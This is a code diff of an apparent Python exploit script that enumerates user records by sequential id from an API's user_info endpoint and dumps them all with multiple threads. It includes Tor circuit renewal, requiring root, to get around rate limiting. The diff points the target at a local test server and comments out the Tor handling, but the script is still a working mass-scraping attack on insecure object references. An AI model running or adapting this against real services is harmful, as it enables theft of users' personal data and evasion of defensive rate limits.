@@ -5,7 +5,7 @@ from dore import *
 from time import sleep
 
 
-def save(juice, filename='out.json'):
+def save(juice, filename='out_dontAdd_.json'):
     """
     After you get the juice out, its now your choice to do stuff with it
 
@@ -29,7 +29,7 @@ def exploit(_id):
     """
 
     url = 'vulnerable.domain/api'
-    url = '127.0.0.1/api'
+    url = 'http://127.0.0.1:3117/user_info'
 
     params = {
                 'id': _id
@@ -41,11 +41,16 @@ def exploit(_id):
         local=True  # This is when, you don't wanna use TOR/proxies
     )
 
+    if not match('resp_code', resp, 404):
+        return resp.json()
+
+    """
     if not match('json', resp, {'err': 'does not exist'}):
         return resp.json()
     elif match('resp_code', resp, 429):  # Got rate limited, here..
         renew()
         return exploit(_id)
+    """
 
 
     """
@@ -69,6 +74,7 @@ if __name__ == '__main__':
     
     print(info(f'Started [at] -> {fetchFormatedTime()}'))
 
+    """
     if not is_root():  # You need to be root, for sending a HUP signal to tor
         print(info('Yoo -> `renew()` will not work..'))
 
@@ -77,15 +83,17 @@ if __name__ == '__main__':
                 'tor.service',
                 start=True
             )
+    """
     
-    filename = 'juice.json'
+    filename = 'juice_dontAdd_.json'
 
     min_id = 1
-    max_id = get_max_id(exploit, iid=min_id)
+    max_id = get_max_id(exploit, iid=min_id, verbose=0)
+    # print(max_id)
     clear_line()
 
     print(info(f'Now -> Dumping the whole thing from `{min_id}` to `{max_id}`'))
-    juice = dump_all(exploit, min_id, max_id, threads=20)
+    juice = dump_all(exploit, min_id, max_id, threads=2)
     clear_line()
 
     # min_id = 70
